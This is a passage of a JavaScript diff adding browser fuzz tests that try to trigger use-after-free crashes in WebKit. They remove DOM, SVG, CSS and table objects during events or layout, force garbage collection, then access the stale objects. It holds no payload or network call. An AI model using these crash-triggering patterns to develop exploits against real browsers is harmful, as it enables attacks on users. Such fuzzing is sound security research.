+        filter.appendChild(prim);
+      }
+      return filter;
+    }
+
+    const filters = [
+      createFilter('f311a', [
+        ['feTurbulence',  { type: 'turbulence', baseFrequency: '0.05', numOctaves: '3', result: 'turb' }],
+        ['feDisplacementMap', { in: 'SourceGraphic', in2: 'turb', scale: '20', result: 'disp' }],
+        ['feBlend',       { in: 'SourceGraphic', in2: 'disp', mode: 'multiply' }],
+      ]),
+      createFilter('f311b', [
+        ['feGaussianBlur',  { stdDeviation: '3', result: 'blur' }],
+        ['feComposite',     { in: 'SourceGraphic', in2: 'blur', operator: 'over' }],
+        ['feColorMatrix',   { type: 'matrix', values: '1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 20 -10' }],
+      ]),
+      createFilter('f311c', [
+        ['feMerge', {}],
+      ]),
+    ];
+
+    for(let f of filters) defs.appendChild(f);
+    svg.appendChild(defs);
+
+    // Elementos que usam os filtros
+    const filteredEls = [];
+    for(let i = 0; i < 15; i++){
+      const rect = document.createElementNS(svgNS, 'rect');
+      rect.setAttribute('width', '40');
+      rect.setAttribute('height', '40');
+      rect.setAttribute('x', (i % 5) * 40);
+      rect.setAttribute('y', Math.floor(i / 5) * 40);
+      rect.setAttribute('fill', 'hsl(' + (i * 24) + ',70%,50%)');
+      rect.setAttribute('filter', 'url(#f311' + ['a','b','c'][i % 3] + ')');
+      svg.appendChild(rect);
+      filteredEls.push(rect);
+    }
+
+    area.appendChild(svg);
+    try { let _ = svg.getBoundingClientRect(); } catch(e){}
+    gc();
+
+    // Remover elementos com filtro + GC + re-acesso
+    for(let el of filteredEls){
+      try {
+        svg.removeChild(el);
+        gc(); // GC: SVGFilterPrimitiveStandardAttributes pode ter stale ptr
+        el.getAttribute('filter'); // acesso pós-remoção
+        svg.appendChild(el);
+        gc();
+      } catch(e){}
+    }
+
+    // Remover definições de filtro com elementos ainda usando
+    for(let f of filters){
+      try {
+        defs.removeChild(f);
+        gc();
+        try { svg.getBoundingClientRect(); } catch(e){} // forçar re-render sem filtro
+        defs.appendChild(f);
+        gc();
+      } catch(e){}
+    }
+
+    area.removeChild(svg);
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 311: fim');
+}
+
+// ─── T312 ─────────────────────────────────────────────────────────────────────
+// HTMLDetailsElement: toggle open + GC durante evento (DetailsMarkerControl UAF)
+// <details> tem um DetailsMarkerControl em fastMalloc; abrir/fechar durante
+// o evento 'toggle' pode causar UAF no DetailsMarkerControl.
+function t312(){
+  log('Teste 312: inicio');
+  try {
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+
+    const details = [];
+    for(let i = 0; i < 20; i++){
+      const d = document.createElement('details');
+      const s = document.createElement('summary');
+      s.textContent = 'summary_' + i;
+      d.appendChild(s);
+      // Conteúdo variado
+      for(let j = 0; j < 5; j++){
+        const p = document.createElement('p');
+        p.textContent = 'content_' + i + '_' + j;
+        d.appendChild(p);
+      }
+      area.appendChild(d);
+      details.push(d);
+    }
+
+    let toggleN = 0;
+    function toggleHandler(evt){
+      toggleN++;
+      const detail = evt.target;
+      try {
+        gc(); // GC durante toggle event
+        // Remover <details> durante toggle — DetailsMarkerControl tem stale ptr
+        if(toggleN % 5 === 0 && detail.parentNode){
+          area.removeChild(detail);
+          gc();
+          area.appendChild(detail);
+        }
+      } catch(e){}
+    }
+
+    for(let d of details) d.addEventListener('toggle', toggleHandler);
+
+    // Abrir/fechar em loop
+    for(let iter = 0; iter < 15; iter++){
+      for(let d of details){
+        try {
+          d.open = true;
+          gc();
+          d.open = false;
+          gc();
+        } catch(e){}
+      }
+    }
+
+    // Remover todos durante toggle event
+    const lastDetail = details[details.length - 1];
+    lastDetail.addEventListener('toggle', function(evt){
+      while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+      gc();
+    }, { once: true });
+    try { lastDetail.open = !lastDetail.open; } catch(e){}
+    gc();
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 312: fim');
+}
+
+// ─── T313 ─────────────────────────────────────────────────────────────────────
+// CSS content-visibility: auto + contain-intrinsic-size + GC
+// Variante do T301: content-visibility auto usa IntersectionObserver interno
+// para decidir se o elemento está visível; mudar contain-intrinsic-size durante
+// a observação pode causar UAF na ResizeObservation interna.
+function t313(){
+  log('Teste 313: inicio');
+  try {
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+    area.style.height = '200px';
+    area.style.overflow = 'auto';
+
+    // Criar elementos com content-visibility: auto
+    const cvEls = [];
+    for(let i = 0; i < 50; i++){
+      const el = document.createElement('div');
+      el.style.cssText = [
+        'content-visibility: auto',
+        'contain-intrinsic-size: 100px 100px',
+        'height: 100px',
+        'background: hsl(' + (i*7) + ',50%,50%)',
+      ].join(';');
+      el.textContent = 'cv_auto_' + i;
+      area.appendChild(el);
+      cvEls.push(el);
+    }
+
+    let _ = area.offsetHeight;
+
+    // Scroll + mudança de contain-intrinsic-size + GC
+    for(let pos of [0, 500, 1000, 2000, 4000, 0]){
+      try {
+        area.scrollTop = pos;
+        gc();
+        // Mudar contain-intrinsic-size enquanto o intersection observer interno recalcula
+        for(let el of cvEls.slice(0, 10)){
+          el.style['contain-intrinsic-size'] = (50 + Math.random() * 100).toFixed(0) + 'px';
+          gc();
+        }
+        _ = area.offsetHeight;
+      } catch(e){}
+    }
+
+    // Remover elementos com content-visibility durante scroll
+    for(let i = 0; i < 10; i++){
+      try {
+        area.scrollTop = i * 500;
+        const el = cvEls[i * 5];
+        if(el && el.parentNode) area.removeChild(el);
+        gc();
+        _ = area.offsetHeight; // forçar recalc da intersection
+        if(el) area.appendChild(el);
+      } catch(e){}
+    }
+
+    area.style.height = '';
+    area.style.overflow = '';
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 313: fim');
+}
+
+// ─── T314 ─────────────────────────────────────────────────────────────────────
+// HTMLImageElement.decode() + GC (ImageLoader Promise UAF)
+// decode() retorna uma Promise que resolve quando a imagem está decodificada;
+// GC durante a Promise pode liberar o ImageLoader antes do resolve.
+function t314(){
+  log('Teste 314: inicio');
+  try {
+    if(typeof HTMLImageElement.prototype.decode !== 'function'){
+      log('Teste 314: fim (sem img.decode())');
+      return;
+    }
+
+    // Criar imagens e chamar decode()
+    const dataSrc = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
+    const imgs = [];
+
+    for(let i = 0; i < 20; i++){
+      try {
+        const img = new Image();
+        img.src = dataSrc;
+        imgs.push(img);
+
+        img.decode().then(function(){
+          gc(); // GC imediatamente após resolve
+          // Acessar img pós-GC
+          img.naturalWidth;
+          img.naturalHeight;
+          img.currentSrc;
+          // Mudar src durante o resolve
+          img.src = 'data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==';
+          return img.decode(); // segunda decodificação encadeada
+        }).then(function(){
+          gc();
+          img.naturalWidth;
+        }).catch(function(e){ gc(); });
+      } catch(e){}
+    }
+
+    // Liberar referências e GC (decode Promises ainda pendentes)
+    imgs.length = 0;
+    gcHeavy();
+
+    // decode() em imagem inválida
+    try {
+      const badImg = new Image();
+      badImg.src = 'data:image/png;base64,INVALIDDATAHERE';
+      badImg.decode().catch(function(e){
+        gc();
+        badImg.naturalWidth; // pós-erro
+      });
+    } catch(e){}
+
+    // decode() + remover do DOM durante decode
+    try {
+      const imgInDOM = document.createElement('img');
+      imgInDOM.src = dataSrc;
+      document.body.appendChild(imgInDOM);
+      imgInDOM.decode().then(function(){
+        gc();
+        document.body.removeChild(imgInDOM);
+        gc();
+        imgInDOM.naturalWidth; // pós-remoção
+      }).catch(function(e){ gc(); });
+    } catch(e){}
+  } catch(e){}
+  log('Teste 314: fim');
+}
+
+// ─── T315 ─────────────────────────────────────────────────────────────────────
+// CSS @layer: insertRule/@layer declaration + GC (LayerStatement UAF)
+// CSS @layer é uma feature relativamente nova; em versões antigas do WebKit
+// o parsing e a cascade layer management podem ter bugs.
+function t315(){
+  log('Teste 315: inicio');
+  try {
+    const style = document.createElement('style');
+    document.head.appendChild(style);
+    const sheet = style.sheet;
+    if(!sheet) throw new Error('sem sheet');
+
+    // Inserir @layer declarations
+    const layerNames = ['base', 'components', 'utilities', 'overrides', 'theme'];
+
+    // Declaração de ordem de layers
+    try {
+      sheet.insertRule('@layer ' + layerNames.join(', ') + ';', 0);
+      gc();
+    } catch(e){}
+
+    // Inserir regras dentro de layers
+    for(let layerName of layerNames){
+      try {
+        sheet.insertRule('@layer ' + layerName + ' { .layer-' + layerName + ' { color: red; font-size: 14px; } }', sheet.cssRules.length);
+        gc();
+      } catch(e){}
+    }
+
+    // Iterar e deletar @layer rules
+    for(let i = sheet.cssRules.length - 1; i >= 0; i--){
+      try {
+        const rule = sheet.cssRules[i];
+        sheet.deleteRule(i);
+        gc();
+        // Acessar rule pós-deleteRule
+        try { rule.cssText; } catch(e){}
+        // Tentar acessar cssRules do @layer se for CSSLayerBlockRule
+        try { rule.cssRules && rule.cssRules.length; } catch(e){}
+        try { rule.name; } catch(e){}
+      } catch(e){}
+    }
+
+    // @layer com regras complexas e aninhadas
+    try {
+      sheet.insertRule(`@layer complex {
+        @media (max-width: 9999px) {
+          .nested-in-layer { background: blue; }
+        }
+      }`, 0);
+      gc();
+      let rule = sheet.cssRules[0];
+      sheet.deleteRule(0);
+      gc();
+      try { rule.cssText; } catch(e){}
+    } catch(e){}
+
+    try { document.head.removeChild(style); } catch(e){}
+  } catch(e){}
+  log('Teste 315: fim');
+}
+
+// ─── T316 ─────────────────────────────────────────────────────────────────────
+// SVG clipPath + <use> referência + remoção encadeada + GC
+// clipPath com <use> que referencia um elemento externo; mudar o elemento
+// referenciado enquanto o clipPath está sendo aplicado pode causar UAF.
+function t316(){
+  log('Teste 316: inicio');
+  try {
+    const svgNS = 'http://www.w3.org/2000/svg';
+    const area  = document.getElementById('svg13');
+    area.style.display = 'block';
+
+    const svg = document.createElementNS(svgNS, 'svg');
+    svg.setAttribute('width', '200');
+    svg.setAttribute('height', '200');
+
+    // Definir formas alvo para os clipPaths
+    const defs = document.createElementNS(svgNS, 'defs');
+    const shapes = [];
+    for(let i = 0; i < 5; i++){
+      const circle = document.createElementNS(svgNS, 'circle');
+      circle.id = 'clipShape13_' + i;
+      circle.setAttribute('cx', 25 + i * 10);
+      circle.setAttribute('cy', 25);
+      circle.setAttribute('r', 20 + i * 5);
+      defs.appendChild(circle);
+      shapes.push(circle);
+    }
+
+    // clipPaths que usam <use> para referenciar as formas
+    const clipPaths = [];
+    for(let i = 0; i < 5; i++){
+      const cp = document.createElementNS(svgNS, 'clipPath');
+      cp.id = 'clip13_' + i;
+      const use = document.createElementNS(svgNS, 'use');
+      use.setAttribute('href', '#clipShape13_' + i);
+      cp.appendChild(use);
+      defs.appendChild(cp);
+      clipPaths.push(cp);
+    }
+    svg.appendChild(defs);
+
+    // Elementos que usam os clipPaths
+    const clippedEls = [];
+    for(let i = 0; i < 10; i++){
+      const rect = document.createElementNS(svgNS, 'rect');
+      rect.setAttribute('width', '50');
+      rect.setAttribute('height', '50');
+      rect.setAttribute('x', (i % 4) * 50);
+      rect.setAttribute('y', Math.floor(i / 4) * 50);
+      rect.setAttribute('fill', 'hsl(' + (i * 36) + ',70%,50%)');
+      rect.setAttribute('clip-path', 'url(#clip13_' + (i % 5) + ')');
+      svg.appendChild(rect);
+      clippedEls.push(rect);
+    }
+
+    area.appendChild(svg);
+    try { let _ = svg.getBoundingClientRect(); } catch(e){}
+    gc();
+
+    // Remover shapes referenciadas pelos clipPaths + GC
+    for(let i = 0; i < shapes.length; i++){
+      try {
+        defs.removeChild(shapes[i]);
+        gc(); // GC: SVGClipPathElement tem stale ptr para shape via <use>
+        // Forçar re-render com clipPath inválida
+        try { svg.getBoundingClientRect(); } catch(e){}
+        defs.appendChild(shapes[i]); // re-inserir
+        gc();
+      } catch(e){}
+    }
+
+    // Remover clipPaths com elementos ainda usando + GC
+    for(let cp of clipPaths){
+      try {
+        defs.removeChild(cp);
+        gc();
+        try { svg.getBoundingClientRect(); } catch(e){}
+        defs.appendChild(cp);
+        gc();
+      } catch(e){}
+    }
+
+    area.removeChild(svg);
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 316: fim');
+}
+
+// ─── T317 ─────────────────────────────────────────────────────────────────────
+// CSS Grid: remoção de item durante layout + GC (GridLayoutAlgorithm UAF)
+// O algoritmo de layout do Grid aloca GridTrack e GridArea em fastMalloc;
+// remover um grid item durante o layout pode causar UAF.
+function t317(){
+  log('Teste 317: inicio');
+  try {
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+
+    // Criar grid complexo
+    const grid = document.createElement('div');
+    grid.style.cssText = [
+      'display: grid',
+      'grid-template-columns: repeat(5, 1fr)',
+      'grid-template-rows: repeat(5, 100px)',
+      'grid-template-areas: "a b c d e" "f g h i j" "k l m n o" "p q r s t" "u v w x y"',
+      'gap: 5px',
+      'width: 600px',
+    ].join(';');
+    area.appendChild(grid);
+
+    // Criar grid items com posicionamento explícito
+    const items = [];
+    const areaNames = 'abcdefghijklmnopqrstuvwxy'.split('');
+    for(let i = 0; i < 25; i++){
+      const item = document.createElement('div');
+      item.style.cssText = [
+        'background: hsl(' + (i * 14) + ',60%,50%)',
+        'grid-area: ' + areaNames[i],
+        'display: flex',
+        'align-items: center',
+        'justify-content: center',
+      ].join(';');
+      item.textContent = areaNames[i];
+      grid.appendChild(item);
+      items.push(item);
+    }
+
+    // Forçar layout
+    let _ = grid.offsetHeight;
+    gc();
+
+    // Remover items durante layout + GC
+    for(let round = 0; round < 15; round++){
+      const idx = round % items.length;
+      try {
+        const item = items[idx];
+        if(item.parentNode) grid.removeChild(item);
+        gc(); // GC: GridLayoutAlgorithm pode ter stale ptr
+        _ = grid.offsetHeight; // forçar re-layout sem o item
+        gc();
+        grid.appendChild(item); // re-inserir
+        _ = grid.offsetHeight;
+        gc();
+      } catch(e){}
+    }
+
+    // Mudar grid-template enquanto items existem
+    const templates = [
+      'repeat(4, 1fr)',
+      'repeat(6, 1fr)',
+      '100px auto 1fr',
+      'minmax(50px, 1fr) 1fr 1fr 1fr 1fr',
+      'repeat(auto-fit, minmax(80px, 1fr))',
+    ];
+    for(let tpl of templates){
+      try {
+        grid.style.gridTemplateColumns = tpl;
+        gc();
+        _ = grid.offsetHeight;
+        gc();
+        // Remover item durante mudança de template
+        if(items[0].parentNode) grid.removeChild(items[0]);
+        gc();
+        grid.appendChild(items[0]);
+      } catch(e){}
+    }
+
+    area.removeChild(grid);
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 317: fim');
+}
+
+// ─── T318 ─────────────────────────────────────────────────────────────────────
+// AbortController + fetch abort + GC (ResourceLoader UAF)
+// fetch() cria um ResourceLoader em fastMalloc; abortar via AbortController
+// durante o carregamento + GC pode causar UAF no ResourceLoader.
+function t318(){
+  log('Teste 318: inicio');
+  try {
+    if(typeof fetch !== 'function'){
+      log('Teste 318: fim (sem fetch API)');
+      return;
+    }
+
+    // Múltiplos fetch + abort em sequência
+    for(let i = 0; i < 20; i++){
+      try {
+        const ctrl = new AbortController();
+        const signal = ctrl.signal;
+
+        // Abortar imediatamente após criar
+        fetch('about:blank#fetch_test_' + i, { signal: signal }).then(function(resp){
+          gc();
+          return resp.text();
+        }).then(function(text){
+          gc();
+          ctrl.abort(); // Abortar após ter a resposta
+          gc();
+        }).catch(function(e){
+          gc(); // GC durante AbortError handler
+          // Tentar usar signal pós-abort
+          try { signal.aborted; }     catch(e){}
+          try { signal.reason; }      catch(e){}
+          try { ctrl.signal; }        catch(e){}
+        });
+
+        // Abortar antes da resposta (race condition)
+        setTimeout(function(){
+          try { ctrl.abort(new Error('abort_reason_' + i)); } catch(e){}
+          gc();
+        }, 0);
+      } catch(e){}
+    }
+
+    // Reutilizar AbortController (não suportado, mas vamos testar)
+    try {
+      const ctrl2 = new AbortController();
+      ctrl2.abort(); // já abortado
+      // Tentar fazer fetch com signal já abortado
+      fetch('about:blank', { signal: ctrl2.signal }).catch(function(e){
+        gc();
+        // Já deve rejeitar imediatamente
+      });
+    } catch(e){}
+
+    // AbortSignal.timeout() (se disponível)
+    try {
+      if(typeof AbortSignal.timeout === 'function'){
+        const timedSignal = AbortSignal.timeout(1); // 1ms timeout
+        fetch('about:blank#timeout_test', { signal: timedSignal }).catch(function(e){
+          gc();
+        });
+      }
+    } catch(e){}
+  } catch(e){}
+  log('Teste 318: fim');
+}
+
+// ─── T319 ─────────────────────────────────────────────────────────────────────
+// HTMLTableElement: createCaption/deleteCaption + tHead/tFoot + GC
+// createCaption cria um HTMLTableCaptionElement em IsoHeap;
+// deletar/recriar durante eventos de tabela pode causar UAF.
+function t319(){
+  log('Teste 319: inicio');
+  try {
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+
+    const table = document.createElement('table');
+    area.appendChild(table);
+
+    // createCaption: cria ou retorna a caption existente
+    const captions = [];
+    for(let i = 0; i < 5; i++){
+      try {
+        let cap = table.createCaption();
+        cap.textContent = 'Caption_' + i;
+        captions.push(cap);
+        gc();
+        // deleteCaption libera o HTMLTableCaptionElement
+        table.deleteCaption();
+        gc();
+        // Tentar acessar cap pós-deleteCaption
+        try { cap.textContent; }  catch(e){}
+        try { cap.parentNode; }   catch(e){}
+        // Re-criar
+        cap = table.createCaption();
+        gc();
+      } catch(e){}
+    }
+
+    // tHead / tFoot manipulation
+    try {
+      const thead = table.createTHead();
+      thead.innerHTML = '<tr><th>H1</th><th>H2</th><th>H3</th></tr>';
+      gc();
+      table.deleteTHead();
+      gc();
+      // Tentar acessar thead pós-deleteTHead
+      try { thead.rows.length; }    catch(e){}
+      try { thead.parentNode; }     catch(e){}
+      // Re-criar
+      const thead2 = table.createTHead();
+      gc();
+    } catch(e){}
+
+    try {
+      const tfoot = table.createTFoot();
+      tfoot.innerHTML = '<tr><td>F1</td><td>F2</td></tr>';
+      gc();
+      table.deleteTFoot();
+      gc();
+      try { tfoot.rows.length; }    catch(e){}
+    } catch(e){}
+
+    // Combinação: criar tudo + deletar tudo + GC
+    for(let i = 0; i < 10; i++){
+      try {
+        const cap  = table.createCaption();
+        const th   = table.createTHead();
+        const tf   = table.createTFoot();
+        const tb   = table.createTBody();
+        cap.textContent = 'combo_' + i;
+        th.innerHTML = '<tr><th>' + i + '</th></tr>';
+        tf.innerHTML = '<tr><td>' + i + '</td></tr>';
+        gc();
+        table.deleteCaption();
+        table.deleteTHead();
+        table.deleteTFoot();
+        tb.parentNode && table.removeChild(tb);
+        gc();
+        // Acessar os elementos deletados
+        try { cap.textContent; th.rows.length; tf.rows.length; } catch(e){}
+      } catch(e){}
+    }
+
+    area.removeChild(table);
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 319: fim');
+}
+
+// ─── T320 ─────────────────────────────────────────────────────────────────────
+// Element.computedStyleMap() + remoção do elemento + GC (CSS Typed OM UAF)
+// computedStyleMap() retorna um StylePropertyMapReadOnly que tem ponteiro
+// para o RenderStyle do elemento; remover o elemento + GC libera o RenderStyle.
+function t320(){
+  log('Teste 320: inicio');
+  try {
+    if(typeof Element.prototype.computedStyleMap !== 'function'){
+      log('Teste 320: fim (sem CSS Typed OM)');
+      return;
+    }
+
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+
+    const elements = [];
+    for(let i = 0; i < 20; i++){
+      const el = document.createElement('div');
+      el.style.cssText = [
+        'width:' + (50 + i*5) + 'px',
+        'height:' + (50 + i*5) + 'px',
+        'background:hsl(' + (i*18) + ',70%,50%)',
+        'font-size:' + (12+i) + 'px',
+        'margin:' + i + 'px',
+        'padding:' + i + 'px',
+        'transform:rotate(' + (i*5) + 'deg)',
+      ].join(';');
+      area.appendChild(el);
+      elements.push(el);
+    }
+
+    let _ = area.offsetHeight;
+
+    // Obter StylePropertyMapReadOnly + remover elemento + GC
+    const maps = [];
+    for(let el of elements){
+      try {
+        const map = el.computedStyleMap();
+        maps.push(map);
+      } catch(e){}
+    }
+
+    // Remover todos os elementos
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    gcHeavy(); // GC: RenderStyle liberado; StylePropertyMapReadOnly tem stale ptr
+
+    // Acessar maps pós-remoção
+    for(let map of maps){
+      try { map.size; }                       catch(e){}
+      try { map.get('width'); }               catch(e){}
+      try { map.get('font-size'); }           catch(e){}
+      try { map.get('transform'); }           catch(e){}
+      try { map.has('background-color'); }    catch(e){}
+      try { for(let [k, v] of map){ k; v; } } catch(e){}
+      try { map.getAll('margin'); }           catch(e){}
+    }
+
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 320: fim');
+}
+
+// ─── T321 ─────────────────────────────────────────────────────────────────────
+// :scope pseudo-class + querySelectorAll + DOM mutation + GC
+// :scope na lista de seletores referencia o contexto do selector;
+// mutar o DOM durante a busca pode causar UAF no SelectorChecker.
+function t321(){
+  log('Teste 321: inicio');
+  try {
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+
+    // Árvore complexa para testar :scope
+    for(let i = 0; i < 10; i++){
+      const outer = document.createElement('div');
+      outer.className = 'scope-outer';
+      outer.id = 'scope_outer_' + i;
+      for(let j = 0; j < 5; j++){
+        const inner = document.createElement('div');
+        inner.className = 'scope-inner';
+        inner.id = 'scope_inner_' + i + '_' + j;
+        for(let k = 0; k < 3; k++){
+          const leaf = document.createElement('span');
+          leaf.className = 'scope-leaf';
+          leaf.textContent = i + '_' + j + '_' + k;
+          inner.appendChild(leaf);
+        }
+        outer.appendChild(inner);
+      }
+      area.appendChild(outer);
+    }
+
+    const outers = Array.from(area.querySelectorAll('.scope-outer'));
+
+    // querySelectorAll com :scope em elementos específicos + mutação
+    for(let outer of outers){
+      try {
+        // :scope referencia 'outer' como contexto
+        const results = outer.querySelectorAll(':scope > .scope-inner > .scope-leaf');
+        gc(); // GC após querySelectorAll
+
+        // Remover filhos durante o uso dos results
+        while(outer.firstChild) try { outer.removeChild(outer.firstChild); } catch(e){}
+        gc(); // GC: NodeList tem stale ptrs
+
+        for(let el of results){
+          try { el.textContent; }   catch(e){}
+          try { el.parentNode; }    catch(e){}
+          try { el.className; }     catch(e){}
+        }
+
+        // Re-popular o outer
+        for(let j = 0; j < 3; j++){
+          const div = document.createElement('div');
+          div.className = 'scope-inner';
+          outer.appendChild(div);
+        }
+        gc();
+      } catch(e){}
+    }
+
+    // :scope em documentFragment
+    try {
+      const frag = document.createDocumentFragment();
+      for(let i = 0; i < 5; i++){
+        const div = document.createElement('div');
+        div.className = 'frag-child';
+        frag.appendChild(div);
+      }
+      const fragResults = frag.querySelectorAll(':scope > .frag-child');
+      gc();
+      for(let el of fragResults) try { el.className; } catch(e){}
+    } catch(e){}
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 321: fim');
+}
+
+// ─── T322 ─────────────────────────────────────────────────────────────────────
+// HTMLTableElement.createTBody() + rows mutation durante iteração + GC
+// createTBody cria um HTMLTableSectionElement; iterar rows enquanto
+// linhas são adicionadas/removidas pode causar OOB ou UAF.
+function t322(){
+  log('Teste 322: inicio');
+  try {
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+
+    const table = document.createElement('table');
+    area.appendChild(table);
+
+    // Criar múltiplos tBodies
+    const bodies = [];
+    for(let b = 0; b < 5; b++){
+      const tbody = table.createTBody();
+      for(let i = 0; i < 20; i++){
+        const row = tbody.insertRow(i);
+        for(let j = 0; j < 4; j++){
+          const cell = row.insertCell(j);
+          cell.textContent = b + '_' + i + '_' + j;
+        }
+      }
+      bodies.push(tbody);
+    }
+
+    let _ = table.offsetHeight;
+    gc();
+
+    // Iterar HTMLTableElement.rows (live collection) + mutar durante iteração
+    const liveRows = table.rows; // HTMLTableRowElement collection — live
+    let rowN = 0;
+    try {
+      for(let row of liveRows){
+        rowN++;
+        gc();
+        // Deletar row do tbody durante iteração
+        if(rowN % 7 === 0 && row.parentNode){
+          const parentBody = row.parentNode;
+          try { parentBody.deleteRow(row.rowIndex); gc(); } catch(e){}
+        }
+        // Inserir nova row durante iteração
+        if(rowN % 11 === 0){
+          try { bodies[0].insertRow(0); gc(); } catch(e){}
+        }
+        if(rowN > 200) break; // limite de segurança
+      }
+    } catch(e){}
+
+    // Remover tBody inteiro enquanto table.rows ainda é acessado
+    for(let body of bodies){
+      try {
+        if(body.parentNode) table.removeChild(body);
+        gc();
+        liveRows.length; // tamanho pós-remoção
+        liveRows[0]; // primeiro elemento pós-remoção
+      } catch(e){}
+    }
+
+    area.removeChild(table);
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 322: fim');
+}
+
+// ─── T323 ─────────────────────────────────────────────────────────────────────
+// CSS custom property (--var) + animação CSS + GC (AnimationTimeline UAF)
+// Animar uma CSS custom property requer que o StyleResolver rastreie os valores;
+// GC durante a animação pode liberar o InterpolableValue interno.
+function t323(){
+  log('Teste 323: inicio');
+  try {
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+
+    // Registrar custom properties animáveis (CSS Houdini registerProperty)
+    try {
+      if(typeof CSS.registerProperty === 'function'){
+        CSS.registerProperty({ name: '--anim-color', syntax: '<color>', inherits: false, initialValue: 'red' });
+        CSS.registerProperty({ name: '--anim-size',  syntax: '<length>', inherits: false, initialValue: '10px' });
+        CSS.registerProperty({ name: '--anim-pct',   syntax: '<percentage>', inherits: false, initialValue: '0%' });
+      }
+    } catch(e){}
+
+    // Injetar @keyframes que anima custom properties
+    const style = document.createElement('style');
+    style.textContent = `
+      @keyframes customVarAnim {
+        from { --anim-color: red;  --anim-size: 10px;  --anim-pct: 0%; }
+        to   { --anim-color: blue; --anim-size: 100px; --anim-pct: 100%; }
+      }
+      .animating-custom-var {
+        animation: customVarAnim 0.1s linear infinite;
+        width: var(--anim-size, 10px);
+        height: var(--anim-size, 10px);
+        background-color: var(--anim-color, red);
+        opacity: calc(var(--anim-pct, 0%) / 100%);
+      }
+    `;
+    document.head.appendChild(style);
+
+    // Criar elementos com animação de custom property
+    const animEls = [];
+    for(let i = 0; i < 15; i++){
+      const el = document.createElement('div');
+      el.className = 'animating-custom-var';
+      el.textContent = 'custom_anim_' + i;
+      area.appendChild(el);
+      animEls.push(el);
+    }
+
+    let _ = area.offsetHeight;
+    gc();
+
+    // Mudar custom property durante animação + GC
+    for(let iter = 0; iter < 20; iter++){
+      for(let el of animEls){
+        try {
+          el.style.setProperty('--anim-color', 'hsl(' + (iter*18) + ',70%,50%)');
+          el.style.setProperty('--anim-size', (10 + iter * 5) + 'px');
+          gc();
+          _ = area.offsetHeight;
+        } catch(e){}
+      }
+    }
+
+    // Remover elementos com animação ativa + GC
+    for(let el of animEls){
+      try {
+        area.removeChild(el);
+        gc();
+        // Acessar el pós-remoção (AnimationTimeline pode ter stale ptr)
+        el.style.getPropertyValue('--anim-color');
+        el.style.getPropertyValue('--anim-size');
+      } catch(e){}
+    }
+
+    try { document.head.removeChild(style); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 323: fim');
+}
+
+// ─── T324 ─────────────────────────────────────────────────────────────────────
+// Proxy + Reflect.ownKeys + WeakRef + GC (novel LLInt pattern)
+// Combinar Proxy ownKeys com WeakRef: target mantido via WeakRef,
+// ownKeys tenta dereferir a WeakRef após GC → potencial crash no LLInt.
+function t324(){
+  log('Teste 324: inicio');
+  try {
+    // WeakRef que pode ser coletada durante o ownKeys do Proxy
+    let target = { a: 1, b: 2, c: 3 };
+    for(let i = 0; i < 50; i++) target['p' + i] = i * 1.1;
+    const wref = new WeakRef(target);
+
+    let ownKeysCount = 0;
+    const p = new Proxy({}, {
+      ownKeys: function(t){
+        ownKeysCount++;
+        gc(); // GC durante ownKeys — pode coletar o WeakRef target
+        const derefed = wref.deref();
+        if(derefed){
+          return Reflect.ownKeys(derefed);
+        }
+        return ['fallback'];
+      },
+      getOwnPropertyDescriptor: function(t, k){
+        gc();
+        const derefed = wref.deref();
+        if(derefed && Object.prototype.hasOwnProperty.call(derefed, k)){
+          return { value: derefed[k], writable: true, enumerable: true, configurable: true };
+        }
+        return { value: undefined, writable: true, enumerable: true, configurable: true };
+      },
+      get: function(t, k, recv){
+        gc();
+        const derefed = wref.deref();
+        return derefed ? derefed[k] : undefined;
+      }
+    });
+
+    // Soltar a referência forte ao target
+    target = null;
+    gcHeavy(); // GC: WeakRef pode ser coletada
+
+    // Usar o Proxy cujo target pode estar coletado
+    for(let i = 0; i < 30; i++){
+      try { Object.keys(p); }       catch(e){}
+      try { Object.values(p); }     catch(e){}
+      try { Object.entries(p); }    catch(e){}
+      try { JSON.stringify(p); }    catch(e){}
+      try { for(let k in p){ k; } } catch(e){}
+    }
+
+    // WeakMap com GC: verificar se chave foi coletada entre set e get
+    try {
+      const wm = new WeakMap();
+      let keys = [];
+      for(let i = 0; i < 100; i++){
+        const k = { id: i };
+        wm.set(k, { data: new Uint8Array(100), id: i });
+        keys.push(k);
+      }
+      // Liberar metade das chaves
+      for(let i = 0; i < 50; i++) keys[i] = null;
+      gcHeavy();
+      // Tentar acessar via chaves sobreviventes e liberadas
+      for(let k of keys){
+        try { if(k) wm.get(k); } catch(e){}
+      }
+    } catch(e){}
+
+    // FinalizationRegistry com callback que acessa dados pós-GC
+    try {
+      const registry = new FinalizationRegistry(function(heldValue){
+        gc(); // GC durante o callback da FinalizationRegistry
+        try { heldValue.data; }    catch(e){}
+        try { heldValue.length; }  catch(e){}
+      });
+
+      for(let i = 0; i < 20; i++){
